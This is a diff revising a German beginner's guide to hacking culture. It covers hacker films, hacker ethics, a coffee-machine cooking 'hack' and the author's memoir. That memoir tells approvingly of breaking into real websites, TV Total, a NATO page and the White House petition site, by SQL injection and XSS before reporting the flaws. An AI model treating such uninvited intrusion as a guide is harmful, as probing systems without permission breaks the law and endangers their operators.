@@ -14,22 +14,22 @@ WIE WERDE ICH HACKER?
 Der Anfänger-Guide von 1337core
 
 Copyright
-Dieses Buch steht unter Creative Commons Lizenz "Namensnennung - Nicht-kommerziell - Weitergabe unter gleichen Bedingungen 3.0 Deutschland" (CC BY-NC-SA 3.0 DE). Das bedeutet, dass es im privaten Umfeld geteilt werden darf. Bei Änderungen daran muss es unter die gleiche Lizenz gestellt werden.
+Dieses digitale Buch steht unter Creative Commons Lizenz "Namensnennung – Nicht-kommerziell – Weitergabe unter gleichen Bedingungen 3.0 Deutschland" (CC BY-NC-SA 3.0 DE). Das bedeutet, dass es im privaten Umfeld geteilt werden darf. Bei Änderungen daran muss es unter die gleiche Lizenz gestellt werden.
 
 Als Namensnennung reicht mein Nickname "1337core" aus.
 
-Versionsnummer: 0.4
+Versionsnummer: 0.7
 
 Feedback kann gerne an feedback@1337core.de gesendet werden.
 
-
+Inhaltsverzeichnis
 Vorwort
-Vielleicht kennst du Texte aus dem Internet zur großen Frage: "Wie werde ich Hacker/-in?" Dort werden einige Themen angesprochen, aber nicht erklärt, wie Einsteiger/-innen dahin kommen. Nach einer Twitter-Umfrage war klar, dass mein Umfeld etwas für Einsteiger/-innen und Scriptkiddies lesen möchte. Also erzähle ich euch etwas von meinem Einstieg ins Hacking. Viel Spaß!
+Vielleicht kennst du Texte aus dem Internet zur großen Frage: "Wie werde ich Hacker/-in?" Dort werden einige Themen angeschnitten, aber nicht erklärt wie Einsteiger/-innen ihr Ziel erreichen können. Nach einer Twitter-Umfrage war klar, dass mein Umfeld etwas für Einsteiger/-innen und Scriptkiddies lesen möchte. Also erzähle ich euch etwas von meinem Einstieg ins Hacking. Viel Spaß!
 
 —
 Was sind Hacker/-innen und wie werde ich eine/-r? Wieso wird der Begriff so unterschiedlich verwendet? Was hat es mit der Netzkultur auf sich? Wie werde ich Hacker/-in mit der Hilfe des Internets? Was ist Hacktivismus und wozu ist es gut? Es geht um Bastler/-innen, Sicherheitslücken, Netzwerke, Bots, Scriptkiddies, blinkende LEDs und vieles mehr. Wie funktioniert es und was kann ich damit machen?
 
-Dieses Buch ist ein schneller Einstieg in die Hackerwelt. Es ist für Einsteiger als Orientierung geschrieben und steigert sich über Netzkultur, Lernen im Internet, IT-Grundlagen, Programmierung, Security hin zu Projekten wie zum Beispiel: Emoji Aquarium, IMSI-Catcher, Schlösser knacken, Freifunk oder offene Server finden.
+Dieses Buch ist ein schneller Einstieg in die Hackerwelt. Es ist für Einsteiger als Orientierungshilfe geschrieben und steigert sich über Netzkultur, Lernen mit Hilfe des Internets, IT-Grundlagen, Programmierung, Security bis hin zu Projekten wie zum Beispiel: Emoji Aquarium, IMSI-Catcher, Schlösser knacken, Freifunk oder offene Server finden.
 
 —
 Was gibt es Schöneres, als sich anzusehen wie Sandra Bullock in "The Net" (1995) an ihrem Rechner Pizza mit extra Knoblauch bestellt? Die 90er hatten einige Hackerfilme zu bieten. Ein Film mit Sandra Bullock könnte der Zenit gewesen sein.
@@ -42,15 +42,14 @@ Yes. The perfect hiding place.
 
 Der Computer ist das perfekte Versteck. Er bietet Informationen und Unterhaltung. Aus dieser Zeit gibt es noch andere interessante Filme. Zum Beispiel "War Games" aus dem Jahre 1983. Im Grunde zeigt der Film, weshalb es eine schlechte Idee wäre künstliche Intelligenz mit Atomwaffen zu verbinden.
 
-Spaß-Fakt: Im Erscheinungsjahr 1983 trat ein Fehler bei der sowjetischen Luftraumüberwachung auf. Dort wurde vor einem Atomraketenangriff gewarnt. Die Angriffsmeldung musste von einem Offizier als Fehlalarm eingestuft werden. Da lohnte sich die gesunde Skepsis. Wer sich für die Story interessiert: Eine Internetsuche nach "Offizier Stanislaw Petrow" hilft dir weiter.
+Spaß-Fakt: Im Erscheinungsjahr 1983 trat ein Fehler bei der sowjetischen Luftraumüberwachung auf. Dort wurde vor einem Atomraketenangriff gewarnt. Die Angriffsmeldung musste von einem Offizier als Fehlalarm eingestuft werden. Da lohnte sich die gesunde Skepsis. Wer sich für diese Story interessiert: Eine Internetsuche nach "Offizier Stanislaw Petrow" hilft dir weiter.
 
 Dazu passt ein schönes Zitat aus "War Games":
 
 General Beringer:
 Gentlemen, I wouldn't trust this overgrown pile of microchips any further than I can throw it.
 
-Ein weiterer Film aus dem Jahre 1995 ist "Hackers". Mit Angelina Jolie. Ja, Freunde. In den 90er wurden Hackerfilme mit aufsteigenden Superstars gedreht. Wenn ich die Totenköpfe ignoriere, die über den Bildschirm fliegen, ist der Film gut. Hackers fängt die richtige Stimmung auf. Telefonnetze ausnutzen (Phone Phreaking: Durch entsprechende Töne, konnten Hacker sich kostenlose Telefonate erschleichen), sich gegen gefährliche Unternehmer wehren (Hacktivismus) und immer das Ziel möglichst beeindruckende Hacks zu liefern. Kulturell liegt der Film richtig. Die lustigen Visualisierungen machen ihn zu einem trashigen Kultfilm. Ich feiere den Film seitdem ich ihn zum ersten Mal sah.
-
+Ein weiterer Film aus dem Jahre 1995 ist "Hackers". Mit Angelina Jolie. Ja, Freunde. In den 90er wurden Hackerfilme mit aufsteigenden Superstars gedreht. Wenn ich die Totenköpfe ignoriere, die über den Bildschirm fliegen, dann ist der Film gut. Hackers fängt die richtige Stimmung auf. Telefonnetze ausnutzen (Phone Phreaking: Durch entsprechende Töne, konnten Hacker sich kostenlose Telefonate erschleichen), sich gegen gefährliche Unternehmer wehren (Hacktivismus) und immer das Ziel möglichst beeindruckende Hacks zu liefern. Kulturell liegt der Film richtig. Die lustigen Visualisierungen machen ihn zu einem trashigen Kultfilm. Ich feiere den Film!
 
 Acid Burn:
 Never send a boy to do a woman's job.
@@ -58,14 +57,14 @@ Never send a boy to do a woman's job.
 Cereal Killer:
 We have no names, man. No names. We are nameless!
 
-Den trashigen Humor und dass alle wie crazy Indie-Models aussehen, finde ich sehr amüsant. Kulturell sind sie aber auf der richtigen Spur. Er hat definitiv einen Platz unter meinen Top 3 Hackerfilmen. Kids, die Bücher lesen und ausprobieren.
+Den trashigen Humor und dass alle wie crazy Indie-Models aussehen, finde ich sehr amüsant. Kulturell sind sie aber auf der richtigen Spur. Kids, die Bücher lesen und ausprobieren.
 
 Die Serie Mr. Robot (2015) macht in Staffel 1 vieles richtig, vor allem aus technischer Sicht. Die Serie beginnt mit den persönlichen Problemen des Hauptcharakters Elliot, seinen Hass auf die echte Welt und Verschwörungstheorien. Eine kleine Gruppe böser Menschen steckt hinter dem Leid der Welt. Der kundige Zuschauer merkt der Serie an, dass sie technisch beraten wurden.
 
 Tyrell Wellick:
 Give a man a gun and he can rob a bank, but give a man a bank, and he can rob the world.
 
-Ein weiterer Film, der interessante Hacks zeigt, ist "Whoami - Kein System ist sicher" aus dem Jahre 2014. Erstaunlicherweise sogar ein deutscher Film. Dann fiel mir noch eine deutsche Serie auf, die 2019 auf Netflix erschien: "How to sell drugs online (fast)". Dort wird korrekt erzählt, wie Tor Hidden Services funktionieren, um anonym im Internet Drogen zu verkaufen. Wobei mir direkt auffiel, dass sie Briefkästen benutzten, die viel zu nah an ihrem Wohnort waren. In Stranger Things Staffel 2 programmiert Bob einen Brute Force Angriff um alle Kombinationen eines vierstelligen Zahlencodes auszuprobieren in der Programmiersprache BASIC.
+Ein weiterer Film, der interessante Hacks zeigt, ist "Whoami - Kein System ist sicher" aus dem Jahre 2014. Erstaunlicherweise sogar ein deutscher Film. Dann fiel mir noch eine deutsche Serie auf, die 2019 auf Netflix erschien: "How to sell drugs online (fast)". Dort wird korrekt erzählt, wie Tor Hidden Services funktionieren, um anonym im Internet Drogen zu verkaufen. Wobei mir direkt auffiel, dass sie Briefkästen benutzten, die viel zu nah an ihrem Wohnort waren. Dann in Stranger Things Staffel 2 programmiert Bob einen Brute Force Angriff um alle Kombinationen eines vierstelligen Zahlencodes auszuprobieren in der Programmiersprache BASIC.
 
 Das sind viele Beispiele, in denen entweder technisch korrekt oder immerhin kulturell korrekt gezeigt wurde, wie Hacker/-innen ticken können. Doch wir merken schon, in den meisten Fällen ist es illegal oder verursacht große Probleme.
 
@@ -89,19 +88,19 @@ Bei der heutigen Rechtslage retten mich nur die Tatsachen, dass dieser Zugang ni
 
 Später interessierten mich immer mehr die Grundlagen dahinter: Netzwerke, das Internet, Webseiten, wie Webseiten gebaut werden, welche Dienste es gibt, wie diese benutzt werden und welchen Unfug ich damit machen kann. Ein Scriptkiddie ist oft jung und kennt sich nicht mit den technischen Hintergründen der Hacker-Tools aus. Es verwendet nur Programme anderer Hacker. Deshalb ist es gerade für Scriptkiddies schwierig anonym zu bleiben oder auch das Resultat ihrer Aktivitäten richtig einzuschätzen.
 
-Je nachdem wie motiviert das Scriptkiddie ist, kommt es damit trotzdem relativ weit, wird aber früher oder später auf Probleme stoßen, da es die Grenzen nicht kennt. Der Klassiker ist auch, dass nach einem Hack damit geprahlt wird.
+Je nachdem wie motiviert das Scriptkiddie ist, kommt es damit trotzdem relativ weit, wird aber früher oder später auf Probleme stoßen, da es seine Grenzen nicht kennt. Der Klassiker: Es wird nach einem Hack damit geprahlt.
 
-Mir wurde früh klar, dass diese Macht auch Verantwortung bedeutet. Durch meine Faszination von Computern war es sicher, dass ich in irgendeine Art IT-Ausbildung muss. Ich interessierte mich damals fast ausschließlich für Computer und das Internet.
+Mir wurde früh klar, dass diese Macht auch Verantwortung bedeutet. Durch meine Faszination von Computern musste ich in irgendeine Art IT-Ausbildung. Ich interessierte mich damals fast ausschließlich für Computer und das Internet.
 
 In meiner Ausbildung gab es auch einen Moment, der mir nochmal bewusst machte, wie wichtig ein moralischer Kompass ist: Ich arbeitete in einer kleinen Firma, die Computer für Privat- und Geschäftskunden zusammenschraubte, installierte und reparierte. Ein Auftrag kam rein, bei dem gelöschte Dateien einer Speicherkarte wiederherzustellen waren. Es ging um die Hausarbeit einer Studentin. Nach etwas Recherche wie das funktioniert, hatte ich ein passendes Tool und konnte die wiederhergestellten Dateien sehen. Neben ihrer Hausarbeit wurden aber auch selbstgemachte Nacktfotos wieder sichtbar.
 
 Ups, Privatsphäre. So genau wollte ich es nicht wissen. Hier würde ich empfehlen im Kapitel "Daten sicher löschen" nachzuschlagen. Es gibt Tools, um solche Fotos richtig zu löschen.
 
-Nach meiner Ausbildung als IT-Systemelektroniker fing ich wieder an mich mehr für das Thema "Hacking" zu interessieren. In einem YouTube Video erklärte damals ein Junge (deutlich vor dem Stimmbruch) wie SQL Injections funktionieren. Es gab eine Testseite und er machte die üblichen Schritte aus einem Tutorial. Bei dieser Lücke können Befehle an die Datenbank übermittelt und z.B. interne Daten gelesen werden.
+Nach meiner Ausbildung als IT-Systemelektroniker fing ich wieder an mich mehr für das Thema "Hacking" zu interessieren. In einem YouTube Video erklärte ein Junge (deutlich vor dem Stimmbruch) wie SQL Injections funktionieren. Es gab eine Testseite und er machte die üblichen Schritte aus einem Tutorial. Bei dieser Lücke können Befehle an die Datenbank übermittelt und z.B. interne Daten gelesen werden.
 
-Daraufhin dachte ich mir: Wie schwer kann das sein? Wenn dieser Junge das nach Anleitung schafft, dann kann ich das bestimmt auch. Drei Wochen später waren meine Skills in SQL Injections, Local File Inclusions und Cross Site Scripting ohne zusätzliche Tools gut genug für Hacks von TV Total, einer NATO-Webseite oder der Petitionswebseite vom Weißen Haus. Ich machte die Betreiber darauf aufmerksam, damit die Sicherheitslücke geschlossen werden.
+Daraufhin dachte ich mir: Wie schwer kann das sein? Wenn dieser Junge das nach Anleitung schafft, dann kann ich das bestimmt auch. Drei Wochen später waren meine Skills in SQL Injections, Local File Inclusions und Cross Site Scripting, ohne zusätzliche Tools, gut genug für Hacks von TV Total, einer NATO-Webseite oder der Petitionswebseite vom Weißen Haus. Ich machte die Betreiber darauf aufmerksam, damit die Sicherheitslücke geschlossen werden.
 
-Im Grunde war mein Ziel, das Internet ein kleines Stück sicherer zu machen. Das Hobby ließ mich nicht los. Auf dem Saarcamp (Barcamp mit freien Vorträgen) hielte ich einen Web Security Vortrag, zeigte und erklärte welche Probleme es immer noch gibt. Demonstrierte eine SQL Injection an einer normalen Webseite. Ich wollte klar machen, dass es sich hierbei um keine komplizierten Lücken handelte.
+Im Grunde war mein Ziel, das Internet ein kleines Stück sicherer zu machen. Das Hobby ließ mich nicht los. Auf dem Saarcamp, ein Barcamp mit freien Vorträgen, hielte ich einen Web Security Vortrag, zeigte und erklärte welche Probleme es immer noch gibt. Demonstrierte eine SQL Injection an einer normalen Webseite. Ich wollte klar machen, dass es sich hierbei um keine komplizierten Lücken handelte.
 
 Nach einer gemeldeten Lücke bei TV Total sponserten sie mir damals zwei Zuschauertickets für ihre Show. Ich war Anfang 20 mit meiner Freundin als Zuschauer bei TV Total, weil ich deren Webseite gehackt habe.
 
@@ -130,20 +129,20 @@ Vorweg: Nicht-männliche Hacker werden gerne auch Hackerinnen oder manchmal Häc
 Was ist ein/-e Hacker/-in?
 Eine Person, die Spaß daran hat, programmierbare Systeme zu erforschen und bis an die Grenzen ihrer Fähigkeiten gehen will. Eine Person, die begeistert (sogar obsessiv) programmiert. Die in der Lage ist, einen guten Hack zu erkennen. Die besonders schnell programmieren kann. Die die intellektuelle Herausforderung liebt, auf kreative Art und Weise Hindernisse zu überwinden oder zu umgehen. Eine Person mit Wissen über technische Geräte sowie das Internet und die Spaß daran hat, die Technik zu überlisten, zu zweckentfremden oder zu modifizieren.
 
-Doch was ist der Unterschied zwischen Programmierern oder Informatikern und Hackern? Diese Frage ist nicht einfach zu beantworten, denn es gibt keine feste Definition. "Software Entwickler/-in" ist eben auch ein normaler Job, der erlernt werden kann, ohne automatisch ein/-e Hacker/-in zu sein.
+Doch was ist der Unterschied zwischen Programmierern oder Informatikern und Hackern? Diese Frage ist nicht einfach zu beantworten, denn es gibt keine feste Definition. "Software Entwickler/-in" ist eben auch ein normaler Job, der erlernt oder studiert werden kann, ohne automatisch ein/-e Hacker/-in zu sein.
 
-Es gibt einige Punkte, bei denen Hacker/-innen sich von Programmierer/-innen unterscheiden: Hacker/-innen probieren neue Dinge aus. Dinge, die nicht dokumentiert sind. Sie experimentieren und testen Software oder Hardware. Sie wissen nicht unbedingt, wie alles funktioniert und versuchen, die Software oder Hardware über ihre Tests zu verstehen. Programmierer/-innen bleiben bei den Systemen die sie kennen. Hacker/-innen versuchen die Software zu einem Verhalten zu bringen, dass ihnen Freude bereitet. Sie versuchen die Ecken zu finden, die nicht dokumentiert sind. Was oft Trial and Error (= Versuch und Irrtum) bedeutet. Hackern bereitet es Freude, was normalerweise Frust hervorruft. Sie fühlen sich davon herausgefordert und werden nicht ruhen, bis sie verstanden haben, was gerade passiert oder sie davon gelangweilt sind.
+Es gibt einige Punkte, bei denen Hacker/-innen sich von Programmierer/-innen unterscheiden: Hacker/-innen probieren neue Dinge aus. Dinge, die nicht dokumentiert sind. Sie experimentieren und testen Software oder Hardware. Sie wissen nicht unbedingt, wie alles funktioniert und versuchen, die Software oder Hardware über ihre Tests zu verstehen. Programmierer/-innen bleiben bei den Systemen, die sie kennen. Hacker/-innen versuchen die Software zu einem Verhalten zu bringen, dass ihnen Freude bereitet. Sie versuchen die Ecken zu finden, die nicht dokumentiert sind. Was oft Trial and Error (= Versuch und Irrtum) bedeutet. Hackern bereitet es Freude, was normalerweise Frust hervorruft. Sie fühlen sich davon herausgefordert und werden nicht ruhen, bis sie verstanden haben, was gerade passiert oder sie davon gelangweilt sind.
 
-Hacker/-innen würden ihre Erkenntnisse mit der Community (= dem Internet) teilen, um damit für ein besseres Verständnis zu sorgen. Sie würden ihre Schritte dokumentieren, um auch andere an diesen Punkt zu bringen. Dadurch haben sie die Möglichkeit darüber hinaus zu kommen. Ein weiterer Unterschied ist, dass ein/-e Programmierer/-in in erster Linie Geld verdienen will und nicht, weil es ein persönliches Bedürfnis ist.
+Hacker/-innen würden ihre Erkenntnisse mit der Community (= dem Internet) teilen, um damit für ein besseres Verständnis zu sorgen. Sie würden ihre Schritte dokumentieren, um auch andere an diesen Punkt zu bringen. Dadurch haben sie die Möglichkeit auch darüber hinaus zu kommen. Ein weiterer Unterschied ist, dass ein/-e Programmierer/-in in erster Linie Geld verdienen will und nicht, weil es ein persönliches Bedürfnis ist.
 
 Als Hacker/-in kannst du einen IT-Job haben,
 aber in einem IT-Job bist du nicht automatisch Hacker/-in.
 
 Es geht um die Freude am Hacking selbst. Ein Hacker oder eine Hackerin fühlt sich von Computern und Software herausgefordert und spielt mit ihnen auf jegliche Art. Dementsprechend verliert er/sie auch schneller das Interesse, wenn es ihm/ihr keinen Spaß mehr bringt. Manchmal ist der einzige Grund etwas zu tun, weil man es kann.
 
-Genauso gibt es Bastler/-innen aus dem "Do It Yourself" oder Maker-Bereich, die nicht automatisch Hacker/-innen sind. Nehmen wir als Beispiel eine Person, die sich gerne handwerklich beschäftigt. Das macht sie nicht automatisch zum Hardware Hacker. Bei Hacker/-innen steht der spielerische und kreative Umgang im Vordergrund. Beim Handwerk ist das möglichst gute Endprodukt das Ziel. Ein guter Hack wäre eine Lösung eines Problems, was entweder besonders kreativ, zweckfremd oder aus vorhandenen Mitteln gebaut wurde. Je schlechter deine Vorraussetzungen, umso größer ist die Chance für einen Hack.
+Genauso gibt es Bastler/-innen aus dem "Do It Yourself" oder Maker-Bereich, die nicht automatisch Hacker/-innen sind. Nehmen wir als Beispiel eine Person, die sich gerne handwerklich beschäftigt. Das macht sie nicht automatisch zum Hardware Hacker. Bei Hacker/-innen steht der spielerische und kreative Umgang im Vordergrund. Beim Handwerk ist das möglichst gute Endprodukt das Ziel. Ein guter Hack wäre die Lösung eines Problems auf besonders kreative Weise oder komplett zweckfremd, mit den vorhandenen Mitteln. Je schlechter deine Vorraussetzungen, umso größer ist die Chance für einen Hack.
 
-Verschiedene Szenen lassen sich nach ihrer Tätigkeit einordnen: Hardware Hacker, Open Source Software, Security, Hacktivismus, File Sharing und Cracking Szene. Ich habe sicherlich irgendeinen Ableger vergessen. Es wurde von der Hacker-Szene versucht die illegalen Tätigkeiten von den "guten" Hackern zu trennen. Dafür wurde der Begriff "Cracker" vorgeschlagen und benutzt. Wer heute eine Zeitung aufschlägt weiß, dass es nicht funktioniert hat. Nicht mal im Ansatz. Wir müssen akzeptieren, dass das Wort "Hacker" zu einem Sammelbegriff für viele Beschreibungen geworden ist.
+Verschiedene Szenen lassen sich nach ihrer Tätigkeit einordnen: Hardware Hacker, Open Source Software, Security, Hacktivismus, File Sharing und Cracking Szene. Ich habe sicherlich irgendeinen Ableger vergessen. Es wurde von der Hacker-Szene versucht die illegalen Tätigkeiten von den "guten" Hackern zu trennen. Dafür wurde der Begriff "Cracker" vorgeschlagen und genutzt. Wer heute eine Zeitung aufschlägt weiß, dass es nicht funktioniert hat. Nicht mal im Ansatz. Wir müssen akzeptieren, dass das Wort "Hacker" zu einem Sammelbegriff für viele Beschreibungen geworden ist.
 
 Bei Einbrechern in Computersysteme unterscheiden wir die Motive: Gab es gute Gründe? Möchten sie Sicherheitslücken aufzeigen und schließen, möchten sie Informationen befreien oder vielleicht Unrecht aufdecken?
 
@@ -151,7 +150,7 @@ Hacker/-innen aus dem Bereich Security, die sich auf der legalen Seite bewegen, 
 
 Die Grey-Hats verstoßen gegen das Gesetz, wollen aber möglicherweise damit Unrecht auf der Welt aufdecken. Sie verfolgen ein höheres moralisches Ziel. Aber angeklagt werden sie trotzdem. ;)
 
-Betrug mithilfe von Hacking für Geld oder Macht? Dann reden wir von einem Black-Hat. Denen bietet das Internet unzählige Möglichkeiten, um das Leben ihrer Opfer zur Hölle zu machen.
+Geht es um Betrug durch Hacking für Geld oder Macht? Dann reden wir von einem Black-Hat. Denen bietet das Internet unzählige Möglichkeiten, um das Leben ihrer Opfer zur Hölle zu machen.
 
 "Wie werde ich denn nun ein/-e richtiger/-e Hacker/-in?", fragte er ironisch in seinem Buch, während er von sich auch noch in der dritter Person schrieb…
 
@@ -159,20 +158,22 @@ Wau Holland, ein Gründungsmitglied des Chaos Computer Clubs, sagte einmal den v
 
 Challenge Accepted!
 
+
+
 Wau Holland:
 Ein Hacker ist jemand, der versucht einen Weg zu finden, wie man mit einer Kaffeemaschine Toast zubereiten kann.
 
-Okay, mache ich.
+Okay, ich mach’s!
 
-Welche Funktionen hat eine Kaffeemaschine und was kann ich damit tun? Eine Filterkaffeemaschine hat eine Brüheinheit, um Wasser zu erhitzen. Damit lässt sich eher schwierig einen Toast zubereiten. Aber es gibt auch die Warmhalteplatte auf der die Kanne steht. Damit lässt sich arbeiten.
+Welche Funktionen hat eine Kaffeemaschine und was kann ich damit tun? Eine Filterkaffeemaschine hat eine Brüheinheit, um Wasser zu erhitzen. Damit lässt sich eher schwierig einen Toast zubereiten. Aber es gibt auch die Warmhalteplatte auf der die Kanne steht. Damit kann ich arbeiten.
 
-Da ich zu Hause keine Kaffeemaschine hatte, bin ich losgezogen und habe mir eine Maschine im Elektrofachhandel meines Vertrauens besorgt. Normalerweise trinke ich Wasser oder Tee. Eine neue Maschine hat den Vorteil, dass das Experiment nicht noch nach Kaffee schmeckt. Damit die Heizplatte überhaupt heiß wird, muss erst Kaffee bzw. Wasser kochen. Danach nehme ich die Kanne weg, decke die Platte mit Aluminiumfolie ab und lege meine Toast darauf.
+Da ich zu Hause keine Kaffeemaschine besaß, bin ich losgezogen und habe mir eine Maschine im Elektrofachhandel meines Vertrauens besorgt. Normalerweise trinke ich Wasser oder Tee. Eine neue Maschine hat den Vorteil, dass das Experiment nicht noch nach Kaffee schmeckt. Damit die Heizplatte überhaupt heiß wird, muss erst Kaffee bzw. Wasser kochen. Danach nehme ich die Kanne weg, decke die Platte mit Aluminiumfolie ab und lege meine Toast darauf.
 
 Nach ein paar Minuten wird klar, dass der Toast zwar leicht getoastet wird, es aber sehr lange dauert, weil meine Maschine dafür zu wenig Power hat.  Vielleicht haben auch alle Maschinen dafür zu wenig Leistung, aber das macht nichts, denn es gibt deutlich bessere Rezepte für die Kaffeemaschine. Die richtig guten Sachen kommen noch.
 
 Eine Kaffeemaschine macht im Prinzip erstmal heißes Wasser. Also lassen sich damit z.B. auch Hot Dogs warm machen. Vegetarische Hot Dogs sind recht schnell genießbar. Ab damit in die Kanne. Wenn die Kanne voller Wasser ist, stelle ich sie zur Seite und lege die Hot Dog Brötchen auch die Heizplatte. Ketchup, Senf, Röstzwiebeln und ein paar Gürkchen dazu. Sehr lecker! Kann ich nur empfehlen.
 
-Ein weiteres Rezept ist die klassische Nudelsuppe. Dazu schneide ich ein bisschen Lauch und eine Karotte in sehr, sehr kleine Würfel, gebe ein paar kleine Suppennudeln dazu und fülle alles in die Kanne. Zusätzlich ordentlich Salz, Pfeffer und Würze rein geben. Gerät anschalten und warten. Wenn die Kanne komplett mit Wasser gefüllt ist, noch ungefähr fünf Minuten warten und danach die Nudelsuppe genießen.
+Ein weiteres Rezept ist die klassische Nudelsuppe. Dazu schneide ich ein Stück Lauch und eine Karotte in sehr, sehr kleine Würfel, gebe ein paar kleine Suppennudeln dazu und fülle alles in die Kanne. Zusätzlich Salz, Pfeffer und Würze rein geben. Gerät anschalten und warten. Wenn die Kanne komplett mit Wasser gefüllt ist, noch ungefähr fünf Minuten warten und danach die Nudelsuppe genießen.
 
 Mit der Kaffeemaschine zu kochen ist durchaus lustig, hat sich bei mir allerdings nicht durchgesetzt. Trotzdem bin ich dem Ziel ein echter Hacker zu werden damit schon wieder einen Schritt näher gekommen. Spaß. ;)
 
@@ -182,7 +183,7 @@ Disclaimer: Einige Dinge, die ich im Buch erkläre, können für illegale Tätig
 
 —
 Hacker-Ethik
-Es gibt keine feste Definition der Hackerethik. Damals wurde sie von Steven Levy in seinem Buch Hackers von 1984 beschrieben. Grundsätzlich dokumentiert sie die Überzeugung, dass das Verbreiten von Wissen, das Erstellen von Software und Dokumentation eine Pflicht jedes Hackers ist. Werte wie Freiheit, Kooperation (z.B. Open Source), freiwillige und selbstgewählte Arbeit gehören dazu.
+Es gibt keine feste Definition der Hackerethik. Damals wurde sie von Steven Levy in seinem Buch "Hackers" von 1984 beschrieben. Grundsätzlich dokumentiert sie die Überzeugung, dass das Verbreiten von Wissen, das Erstellen von Software und Dokumentation eine Pflicht jedes Hackers ist. Werte wie Freiheit, Kooperation (z.B. Open Source), freiwillige und selbstgewählte Arbeit gehören dazu.
 
 Der "Chaos Computer Club" fasst es grob so zusammen:
 Der Zugang zu Computern und allem, was einem zeigen kann, wie diese Welt funktioniert, sollte unbegrenzt und vollständig sein.
@@ -197,7 +198,7 @@ Mülle nicht in den Daten anderer Leute.
 Meine Interpretation dieser Grundsätze sieht folgendermaßen aus:
 
 Freier Zugang zu Computern
-Alles was dir hilft diese Welt zu verstehen sollte frei und erreichbar sein. Wissen und Dokumentation gibt dir die Möglichkeit Dinge zu verstehen, reparieren oder gänzlich Neues zu entdecken. Hardware sollte nachhaltig und ressourcen-schonend genutzt werden. Das fängt damit an alte oder ungenutzte Hardware weiter zu verkaufen oder zu verschenken. Hinweis: Am besten ohne deine alte Festplatte.
+Alles, was dir hilft diese Welt zu verstehen, sollte frei und erreichbar sein. Wissen und Dokumentation gibt dir die Möglichkeit Dinge zu verstehen, reparieren oder gänzlich Neues zu entdecken. Hardware sollte nachhaltig und ressourcen-schonend genutzt werden. Das fängt damit an alte oder ungenutzte Hardware weiter zu verkaufen oder zu verschenken. Hinweis: Am besten ohne deine alte Festplatte.
 
 Verbreitung von Wissen
 Jedes System gewinnt Vertrauen durch Transparenz und Fairness. Freier Zugriff auf Wissen und Austausch ermöglicht Kreativität. Frei im Sinne von Freiheit. Nicht unbedingt im Sinne von kostenlos. Damit ist das Teilen deines Internetzugangs gemeint oder das Erstellen von Anleitungen und Dokumentationen wie unsere Software (oder wie die Welt) funktioniert. Eines der größten Projekte dazu ist Wikipedia. Alle Open Source Projekte gehören auch dazu. Als Beispiel um überhaupt Zugang zu diesem Wissen zu bekommen würde ich auch noch Freifunk (= kostenloses WLAN, üblicherweise mit Internet) dazu zählen.
@@ -219,7 +220,7 @@ Als weiteres Grundsatzdokument gibt es das Jargon File ("The New Hacker's Dictio
 
 Die Hacker-Ethik wird durchaus nicht kritiklos von den unterschiedlichen Szenen hingenommen. Gerade in der Security-Szene wird oft diskutiert, ob Leaks (veröffentlichen von geheimen Informationen, die auf unethisches Verhalten hinweisen oder es aufdecken) der Hacker-Ethik entsprechen.
 
-Allein die Tatsache, dass es mehrere Definitionsversuche der Hacker-Ethiken gibt, die diskutiert werden, weißt darauf hin, dass Hacker/-innen sich durchaus Gedanken darüber machen, in welchen moralischen Grenzen sie ihr Können einsetzen wollen.
+Allein die Tatsache, dass es mehrere Definitionsversuche der Hacker-Ethiken gibt, die diskutiert werden, weißt darauf hin, dass Hacker/-innen sich durchaus Gedanken darüber machen, innerhalb welchen moralischen Grenzen sie ihr Können einsetzen wollen.
 
 Die oben beschriebene Ethik wird leider auch eingesetzt, um Kritik an grundsätzlich guten Projekten zu äußern, die nicht jeden einzelnen Punkt auf idealistischste Weise umsetzen. Auch das führt schnell zu einer Spaltung und Demotivation in Gruppen. Wie man sich selbst so die ganze Bewegung kaputt macht, sah man an der Piratenpartei in Deutschland. Mach das bitte nicht.
 
@@ -227,7 +228,7 @@ Die oben beschriebene Ethik wird leider auch eingesetzt, um Kritik an grundsätz
 Wie werde ich ein/-e Hacker/-in?
 Das ist der Popcorn-Moment. Es gibt viele schlechte "Hacker Foren" in denen genau diese Frage gestellt wird. Doch oft stecken Kiddies dahinter, die gerne ihre Freunde ausspionieren wollen oder unbedingt die Facebook Seite ihrer Klassenkameradin hacken möchten. Ich habe Verständnis dafür, denn ich war auch mal 12 Jahre alt.
 
-Am Ende landen sie bei "facebookhackertoolwirklichkeintrojaner.exe", versauen sich ihren PC, können ihn nicht reparieren, aber lernen hoffentlich etwas daraus. Aber niemand will Minderjährige mit möglicherweise gehackten Webcams in ihren Kinderzimmern haben. Als Anfänger gibt es viel zu lernen, um überhaupt erstmal in die Lage zu kommen, um mit der Technologie auf kreative Weise spielen zu können.
+Am Ende landen sie bei "facebook-hackertool-wirklich-kein-trojaner.exe", versauen sich ihren PC, können ihn nicht reparieren, aber lernen hoffentlich etwas daraus. Aber niemand will Minderjährige mit möglicherweise gehackten Webcams in ihren Kinderzimmern haben. Als Anfänger gibt es viel zu lernen, um überhaupt erstmal in die Lage zu kommen, um mit der Technologie auf kreative Weise spielen zu können.
 
 Wenn ich diese Frage in die Suchmaschine meiner Wahl eintippe, dann kommen dort immer die folgenden drei Hauptthemen heraus:
 Grundlegende Fertigkeiten des Hackens.
@@ -238,7 +239,7 @@ Den ersten Punkt werden wir als Grundwissen abhandeln. Das sind hauptsächlich I
 
 Wie ein/-e Hacker/-in zu denken ist etwas schwieriger. Hier geht es oft darum sich kreative Lösungen zu überlegen oder Dinge zu verbinden, die eigentlich nicht zusammen gehören. Das ist auch erst mit technischen Fähigkeiten möglich.
 
-Der letzte Punkt "Respekt verdienen" ist etwas schwieriger zu erklären. Früher hätte ich dazu "Fame" gesagt und behauptet, dass es darum geht möglichst der coolste Hacker von allen zu sein. Im Script Kiddie Bereich ist das durchaus üblich. Das ist hier aber nicht gemeint. Es geht dabei nicht um den Hack, sondern um dich als Person. Aufrichtig sein, zuhören und lernen, Empathie und Hilfe anbieten. Andere respektieren und sich deren Respekt verdienen. Das ist keine Einbahnstraße.
